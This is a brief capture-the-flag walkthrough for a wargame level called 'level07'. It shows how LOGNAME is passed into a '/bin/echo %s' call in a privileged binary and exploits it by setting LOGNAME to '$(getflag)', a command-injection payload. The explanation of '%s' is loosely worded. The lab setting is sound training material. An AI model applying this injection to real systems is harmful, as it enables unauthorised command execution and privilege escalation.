## LEVEL 07

Let's see what files we got here.  
-> `ls -la` or `la`  
We have an executable named *level07* and if we try to launch it,  
-> `./level07`  
It just prints *'level07'*. So, we filter it to get all the printable characters, as same as **level03**.  
-> `strings level07`  
We can notice that it has *LOGNAME* and */bin/echo %s*.

> **%s** in a command means the prefix is replaced with a variable.

Futhermore, *echo* will print the value of *LOGNAME*. To exploit this, we just have to change the value of *LOGNAME* to `getflag`.  
-> `export LOGNAME='$(getflag)'`  
-> `./level07`  
And now, we can go to the next level.  
-> `su level08`